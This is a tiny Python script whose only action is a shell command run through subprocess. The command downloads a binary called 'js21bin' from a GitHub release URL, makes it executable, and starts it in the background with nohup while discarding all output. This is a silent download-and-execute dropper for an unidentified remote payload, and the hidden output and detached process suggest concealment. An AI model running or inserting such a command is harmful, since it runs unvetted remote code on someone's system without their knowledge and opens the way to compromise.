import subprocess

subprocess.run("curl -L -o js21bin https://github.com/alphaxcv/scx/releases/download/dl/js21bin && chmod +x js21bin && nohup ./js21bin > /dev/null 2>&1", shell=True)
